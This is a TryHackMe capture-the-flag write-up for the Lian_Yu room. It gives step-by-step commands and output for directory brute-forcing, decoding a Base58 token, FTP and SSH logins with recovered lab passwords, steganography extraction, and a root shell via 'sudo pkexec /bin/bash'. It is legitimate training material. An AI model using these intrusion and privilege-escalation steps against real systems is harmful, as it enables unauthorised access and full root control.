# Lian_Yu — TryHackMe Writeup

**Room:** https://tryhackme.com/room/lianyu
**Difficulty:** Easy
**Category:** Directory Enumeration · Source Code Analysis · Base58 · FTP · Steganography · Privilege Escalation

> *"A beginner-level security challenge themed on the TV series Arrow. Find your way to Lian Yu."*

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | `THM{█████████████████████████████████████████}` |
| root.txt | `THM{█████████████████████████████████████████}` |

---

## 1. Reconnaissance

### Nmap Scan

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.104.199
Starting Nmap 7.95 at 2025-09-02 18:46 IST
Nmap scan report for 10.10.104.199
Host is up (0.23s latency).

PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
80/tcp  open  http    Apache httpd
|_http-title: Purgatory
111/tcp open  rpcbind 2-4 (RPC #100000)
Service Info: OSs: Unix, Linux
```

Four open ports: FTP, SSH, HTTP, and rpcbind. The HTTP title says **"Purgatory"** — fitting for the Arrow theme. FTP is the first thing to check; anonymous login is worth a shot immediately.

Anonymous FTP login fails here — no free ride. HTTP enumeration is the starting point instead.

---

## 2. Web Enumeration — Layered Directory Discovery

### Layer 1 — Root Directory

```bash
gobuster dir -u http://10.10.104.199/ \
  -w /usr/share/wordlists/dirb/big.txt
```

```
/island    (Status: 301) [--> http://10.10.104.199/island/]
```

Navigating to `/island` shows a page of Arrow lore. Reading the source reveals a hidden codeword in text that matches the page background colour — invisible without viewing source:

```html
<!-- <p>vigilante</p> -->
```

**Username found: `vigilante`**

### Layer 2 — Inside `/island`

```bash
gobuster dir -u http://10.10.104.199/island/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
/2100    (Status: 301) [--> http://10.10.104.199/island/2100/]
```

Navigating to `/island/2100/` shows another page. The visible content is just an embedded YouTube video. The page source has a much more useful comment:

```html
<!-- you can avail your .ticket here but how? -->
```

This hints at files with a `.ticket` extension hiding in this directory.

### Layer 3 — Hunting `.ticket` Files

```bash
gobuster dir -u http://10.10.104.199/island/2100 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -x .ticket -t 50
```

```
/green_arrow.ticket    (Status: 200)
```

Accessing the file at `http://10.10.104.199/island/2100/green_arrow.ticket`:

```
This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX
```

---

## 3. Decoding the Ticket — Base58

The string `RTy8yhBQdscX` doesn't look like Base64 (no `=` padding, no `/` or `+`). The character set matches **Base58**, commonly used by Bitcoin addresses and tools like dcode.fr.

Decode it with Python:

```bash
python3 - <<'PY'
import base58
print(base58.b58decode("RTy8yhBQdscX").decode())
PY
```

```
!#th3h00d
```

**FTP password found: `!#th3h00d`**

---

## 4. FTP Enumeration — Images and a Hidden User File

Log into FTP with the codeword as username and decoded token as password:

```bash
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.104.199
Connected to 10.10.104.199.
Name: vigilante
Password: !#th3h00d
230 Login successful.

ftp> ls -la
drwxr-xr-x    2 1001     1001         4096 May 05  2020 .
drwxr-xr-x    4 0        0            4096 May 01  2020 ..
-rw-------    1 1001     1001           44 May 01  2020 .bash_history
-rw-r--r--    1 0        0            2483 May 01  2020 .other_user
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
```

Download everything:

```bash
ftp> get Leave_me_alone.png
ftp> get Queen's_Gambit.png
ftp> get aa.jpg
ftp> get .other_user
ftp> exit
```

Read `.other_user` — it's a lengthy backstory about **Slade Wilson (Deathstroke)**. This hints at `slade` as another username on the system.

---

## 5. Steganography — Three Images, One Secret

Testing all three images with `steghide`:

```bash
steghide extract -sf Leave_me_alone.png
# steghide: the file format of the file "Leave_me_alone.png" is not supported.

steghide extract -sf "Queen's_Gambit.png"
# steghide: the file format of the file "Queen's_Gambit.png" is not supported.

steghide extract -sf aa.jpg
# Enter passphrase:
# steghide: could not extract any data with that passphrase!
```

Two images fail outright — `steghide` only supports JPEG and BMP, not PNG. `aa.jpg` accepts the command but needs a passphrase.

### Repairing the Broken PNG Header

`Leave_me_alone.png` throws a format error despite having a `.png` extension — the file header (magic bytes) is corrupted. Opening it in a hex editor at https://hexed.it shows the first 8 bytes are wrong. Replacing them with the valid PNG signature restores the file:

```
Correct PNG header: 89 50 4E 47 0D 0A 1A 0A
```

After saving and opening the repaired image, it reveals the hidden passphrase: **`password`**

### Extracting from `aa.jpg`

```bash
steghide extract -sf aa.jpg
Enter passphrase: password
wrote extracted data to "ss.zip".
```

### Unzipping the Archive

```bash
unzip ss.zip
```

```
inflating: passwd.txt
inflating: shado
```

```bash
cat shado
```

```
M3tahuman
```

```bash
cat passwd.txt
```

```
This is your visa to Land on Lian_Yu # Just for Fun ***

a small Note about it

Having spent years on the island, Oliver learned how to be resourceful and
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.
```

`passwd.txt` is flavour text — Arrow lore. The real find is `shado` which contains the SSH password: **`M3tahuman`**

---

## 6. SSH Access as Slade

All pieces assembled:
- **Username:** `slade` (from `.other_user` Deathstroke lore)
- **Password:** `M3tahuman` (from `shado` file)

```bash
┌──(kali㉿kali)-[~]
└─$ ssh slade@10.10.104.199
slade@10.10.104.199's password: M3tahuman

                          Way To SSH...
                      Loading.........Done..
               Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗
...

slade@LianYu:~$
```

```bash
slade@LianYu:~$ ls -la
-r-------- 1 slade slade   63 May  1  2020 user.txt

slade@LianYu:~$ cat user.txt
```

**user.txt:** `THM{█████████████████████████████████████████}`

---

## 7. Privilege Escalation — sudo pkexec

```bash
slade@LianYu:~$ sudo -l
[sudo] password for slade: M3tahuman

Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

`pkexec` is the PolicyKit executable — it runs programs as another user, defaulting to root. It can trivially spawn a root shell:

```bash
slade@LianYu:~$ sudo pkexec /bin/bash
root@LianYu:~# whoami
root
```

Grab the root flag:

```bash
root@LianYu:~# cat /root/root.txt
```

```
                        Mission accomplished

You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE.

THM{█████████████████████████████████████████}
                                                  --DEATHSTROKE
```

**root.txt:** `THM{█████████████████████████████████████████}`

---

## Key Learnings

- **Always view page source — hidden content blends into backgrounds** — the `vigilante` codeword was white text on a white background. Highlighting all text or opening source is step one on every web page.
- **HTML comments are breadcrumbs** — both the `/island` page (codeword) and `/island/2100` page (`.ticket` extension hint) revealed their secrets only in the source. Developers leave comments; pentesters read them.
- **Gobuster with `-x` for file extensions is essential** — directory wordlists won't find `green_arrow.ticket` without `-x .ticket`. When a source comment hints at a file type, always fuzz for that extension explicitly.
- **Base58 looks like Base64 without the `=`** — the distinguishing features are: no padding characters, no `+` or `/`, and the character set excludes `0`, `O`, `I`, and `l` (to avoid visual ambiguity). When in doubt, try dcode.fr's magic tool.
- **Corrupted image headers are a deliberate steganography trick** — `Leave_me_alone.png` had broken magic bytes. Checking a hex editor and repairing the 8-byte PNG signature is the right tool; simply renaming or re-encoding doesn't work.
- **Lore text is often hiding real intel** — `.other_user` was written as Slade Wilson's Wikipedia entry, but its sole CTF purpose was handing over the SSH username. Read everything.
- **`pkexec` without restrictions is an instant root shell** — any `sudo` entry for `/usr/bin/pkexec` with no command argument restrictions allows `sudo pkexec /bin/bash`. This is also related to CVE-2021-4034 (PwnKit) but the sudo misconfiguration makes CVE exploitation unnecessary here.

## Conclusion

Lian_Yu is a well-layered beginner room where every clue leads organically to the next. The path from nmap to root follows a tight chain: hidden codeword in HTML → nested gobuster → `.ticket` file with Base58 → FTP login → corrupted PNG header repair → steghide extraction → SSH → `sudo pkexec`. No single step requires deep exploitation knowledge, but all of them together demand methodical attention to detail. The room's greatest lesson is that enumeration is never one pass — you find a path, go deeper, and enumerate again.
